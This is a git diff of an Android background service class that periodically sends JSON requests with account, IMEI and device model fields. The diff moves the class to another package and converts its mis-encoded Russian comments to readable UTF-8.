@@ -1,13 +1,10 @@
-package com.inet.android.bs;
+package com.inet.android.request;
 
 import java.util.Calendar;
 
 import org.json.JSONException;
 import org.json.JSONObject;
 
-import com.inet.android.request.DelRequest;
-import com.inet.android.request.PeriodicRequest;
-import com.inet.android.request.StartRequest;
 import com.inet.android.utils.Logging;
 
 import android.app.AlarmManager;
@@ -18,16 +15,16 @@ import android.content.SharedPreferences;
 import android.os.IBinder;
 import android.preference.PreferenceManager;
 
-/** Êëàññ ñåðâèñà îòïðàâêè ïåðèîäè÷åñêîãî çàïðîñà
+/**
  * 
- * @author johny homicide
+ *Класс сервиса отправки периодического запроса
  *
  */
 public class Request4 extends Service {	
 	private static final int SERVICE_REQUEST_CODE = 35;
 		final String LOG_TAG = "request4";
 		SharedPreferences sPref;
-		int period = 10; // ïåðèîäè÷íîñòü çàïðîñîâ
+		int period = 10; // периодичность запросов
 
 		public void onCreate() {
 			super.onCreate();
@@ -45,7 +42,7 @@ public class Request4 extends Service {
 				sendStartRequest();
 			}
 
-			// Ïðèøåë ëè device?
+			// Пришел ли device?
 			if (code.equals("0")) {
 				Logging.doLog(LOG_TAG, "code : 0", "code : 0");
 
@@ -65,11 +62,11 @@ public class Request4 extends Service {
 			}
 
 			if (code.equals("1") || code.equals("2")) {
-				sendPeriodicRequest(); // âûïîëíåíèå ïåðèîäè÷åñêîãî çàïðîñà
+				sendPeriodicRequest(); // выполнение периодического запроса
 			}
 
 			Calendar cal = Calendar.getInstance();
-			cal.add(Calendar.MINUTE, Integer.parseInt(sp.getString("period", "120")));// ÷åðåç period ìèíóò
+			cal.add(Calendar.MINUTE, Integer.parseInt(sp.getString("period", "120")));// через period минут
 
 			PendingIntent servicePendingIntent = PendingIntent.getService(this,
 					SERVICE_REQUEST_CODE, new Intent(this, Request4.class),
@@ -90,17 +87,19 @@ public class Request4 extends Service {
 //		}
 
 		/**
-		 * Îòïðàâêà ñòàðòîâîãî çàïðîñà
+		 * Отправка стартового запроса
 		 */
 		private void sendStartRequest() {
 			Logging.doLog(LOG_TAG, "send start request", "send start request");
-
+		
 			SharedPreferences sp = PreferenceManager.getDefaultSharedPreferences(this);
+			Logging.doLog(LOG_TAG, "send start request, imei: ", sp.getString("imei", "imei"));
+
 			JSONObject jsonObject = new JSONObject();
 			try {
 				jsonObject.put("account", sp.getString("account", "0000"));
-				jsonObject.put("imei", sp.getString("imei", "0000"));
-				jsonObject.put("model", "iphone");
+				jsonObject.put("imei", sp.getString("imei", "imei"));
+				jsonObject.put("model", sp.getString("model", "0000"));
 			} catch (JSONException e) {
 				e.printStackTrace();
 			}
@@ -111,7 +110,7 @@ public class Request4 extends Service {
 		}
 
 		/**
-		 * Îòïðàâêà ïåðèîäè÷åñêîãî çàïðîñà
+		 * Отправка периодического запроса
 		 */
 		private void sendPeriodicRequest() {
 			Logging.doLog(LOG_TAG, "requestTask start", "requestTask start");
@@ -122,9 +121,9 @@ public class Request4 extends Service {
 			try {
 				jsonObject.put("device", sp.getString("device", "0000"));
 				jsonObject.put("account", sp.getString("account", "0000"));
-				jsonObject.put("imei", sp.getString("imei", "0000"));
+				jsonObject.put("imei", sp.getString("imei", "imei"));
 			} catch (JSONException e) {
-				Logging.doLog(LOG_TAG, "÷òî-òî íå òàê ñ json", "÷òî-òî íå òàê ñ json");
+				Logging.doLog(LOG_TAG, "что-то не так с json", "что-то не так с json");
 				e.printStackTrace();
 			}
 
@@ -161,7 +160,7 @@ public class Request4 extends Service {
 		}
 
 		/**
-		 * Îòïðàâêà çàïðîñà íà óäàëåíèå
+		 * Отправка запроса на удаление
 		 */
 		public void sendDelRequest() {
 			Logging.doLog(LOG_TAG, "sendDelRequest start", "sendDelRequest start");
@@ -172,10 +171,10 @@ public class Request4 extends Service {
 			try {
 				jsonObject.put("device", sp.getString("device", "0000"));
 				jsonObject.put("account", sp.getString("account", "0000"));
-				jsonObject.put("imei", sp.getString("IMEI", "0000"));
+				jsonObject.put("imei", sp.getString("IMEI", "imei"));
 				jsonObject.put("mode", "1");
 			} catch (JSONException e) {
-				Logging.doLog(LOG_TAG, "÷òî-òî íå òàê ñ json", "÷òî-òî íå òàê ñ json");
+				Logging.doLog(LOG_TAG, "что-то не так с json", "что-то не так с json");
 				e.printStackTrace();
 			}
 
